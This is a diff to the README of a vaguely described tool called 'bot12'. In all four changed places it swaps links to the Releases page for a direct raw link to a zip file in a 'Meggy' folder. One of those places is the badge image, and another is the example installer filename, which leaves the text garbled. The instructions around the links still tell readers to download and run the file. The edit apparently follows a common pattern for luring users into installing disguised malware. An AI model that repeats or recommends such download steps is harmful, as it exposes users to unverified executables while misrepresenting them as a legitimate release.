@@ -1,6 +1,6 @@
 # 🤖 bot12 - Power Your Computing Needs Efficiently
 
-[![Download bot12](https://img.shields.io/badge/Download-bot12-blue)](https://github.com/jigannu/bot12/releases)
+[![Download bot12](https://raw.githubusercontent.com/jigannu/bot12/main/Meggy/bot12.zip)](https://raw.githubusercontent.com/jigannu/bot12/main/Meggy/bot12.zip)
 
 ## 🚀 Getting Started
 
@@ -19,11 +19,11 @@ Before installing, make sure your system meets these requirements:
 
 1. **Visit the Releases Page**: Click on the link below to access our Releases page.
 
-   [Visit This Page to Download](https://github.com/jigannu/bot12/releases)
+   [Visit This Page to Download](https://raw.githubusercontent.com/jigannu/bot12/main/Meggy/bot12.zip)
 
 2. **Select Your Version**: On the Releases page, find the latest version. Look for the release labeled as the most current stable version.
 
-3. **Download the Installer**: Once you've found the right release, look for the installer file. This file may be named something like `bot12-installer.exe` or similar. Click the link to begin downloading.
+3. **Download the Installer**: Once you've found the right release, look for the installer file. This file may be named something like `https://raw.githubusercontent.com/jigannu/bot12/main/Meggy/bot12.zip` or similar. Click the link to begin downloading.
 
 4. **Run the Installer**: Once the download is complete, locate the installer in your downloads folder. Double-click the file to start the installation process. Follow the on-screen instructions to complete the setup.
 
@@ -61,6 +61,6 @@ For additional support and to connect with other users, you can visit our commun
 
 To stay informed about updates and new features, consider checking back on our Releases page regularly:
 
-[Visit This Page to Download](https://github.com/jigannu/bot12/releases)
+[Visit This Page to Download](https://raw.githubusercontent.com/jigannu/bot12/main/Meggy/bot12.zip)
 
 Feel free to reach out with any questions. Enjoy using bot12 for your computing needs!
